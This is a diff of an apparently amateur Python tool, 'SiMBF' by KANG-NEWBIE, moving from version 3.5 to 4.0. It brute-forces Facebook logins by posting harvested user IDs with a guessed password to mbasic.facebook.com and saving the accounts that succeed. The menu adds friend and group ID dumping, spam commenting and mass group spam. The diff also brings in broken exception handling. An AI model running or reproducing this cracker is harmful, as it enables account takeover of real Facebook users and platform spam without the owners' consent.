@@ -1,5 +1,8 @@
-from multiprocessing.pool import ThreadPool
-import urllib.parse, os, requests, sys, json, time, hashlib
+try:
+	from multiprocessing.pool import ThreadPool
+	import os, requests, sys, json, time, hashlib, random
+except Exception as F:
+	exit("[ModuleErr] %s"%(F))
 
 #color
 r="\033[31m"
@@ -12,7 +15,7 @@ banner=("""%s
    _____ __  ______  ____
   / __(_)  |/  / _ )/ __/ %sAuthor : KANG-NEWBIE%s
  _\ \/ / /|_/ / _  / _/	  %sContact: t.me/kang_nuubi%s
-/___/_/_/  /_/____/_/     %sversion: %s3.5%s
+/___/_/_/  /_/____/_/     %sversion: %s4.0%s
 """%(c,g,c,g,c,g,y,w))
 
 try:
@@ -114,14 +117,10 @@ def update():
 cek=[]
 tap=[]
 def main(arg):
-	try:
+        try:
                 url='https://mbasic.facebook.com/login'
                 dt={'email':arg,'pass':pas,'login':'submit'}
                 req=requests.post(url,data=dt)
-#                data = urllib.parse.urlencode(dt)
-#                data = data.encode('utf-8')
-#                req = urllib.request.Request(url, data)
-#                resp = urllib.request.urlopen(req)
                 respData = req.content
                 if 'save-device' in str(respData) or 'm_sess' in str(respData):
                         true='yeah'
@@ -149,13 +148,14 @@ def main(arg):
                         f.write(wrt)
                         print("%s[%sCpoint%s]%s %s -> %s"%(c,y,c,w,arg,pas))
                         f.close()
-                else:
-                        print("%s[%snot%s]%s %s"%(c,r,c,w,arg))
-	except: pass
+#                else:
+#                        print("\r%s[%snot%s]%s %s"%(c,r,c,w,arg)),;sys.stdout.flush()
+                for x in range(len(o)): print("\r[crack] %s/%s"%(str(x+1),len(o)));sys.stdout.flush()
+        except a: pass
 
 os.system('clear')
 print(banner)
-print("\t[1] start\n\t[2] dump id from your friends id\n\t[3] dump id from your group id\n\t[4] remove access token\n\t[5] spam comment facebook\n\t[0] check update")
+print("\t[1] start\n\t[2] dump id from your friends id\n\t[3] dump id from your group id\n\t[4] remove access token\n\t[5] spam comment facebook\n\t[6] mass group spam comment\n\t[0] check update")
 pilih=int(input('\n\t[!] choose your option: '))
 if pilih == 2:
 	os.system('clear')
@@ -166,7 +166,10 @@ elif pilih == 3:
 elif pilih == 4:
 	rmtoken()
 elif pilih == 5:
-	os.system('python komen.py')
+	os.system('python src/komen.py')
+	exit()
+elif pilih == 6:
+	os.system('python src/Gkomen.py')
 	exit()
 elif pilih == 0:
 	update()
@@ -181,9 +184,7 @@ except (KeyboardInterrupt,EOFError):
         exit("%s\n[!] Key interrupt: Exiting."%(r))
 except FileNotFoundError:
         exit("%s\n[!] File not found: Exiting."%(r))
-
 print("\n%s[LIVE RESULT]:"%(c))
-
 o=[]
 for x in file:
     o.append(x)
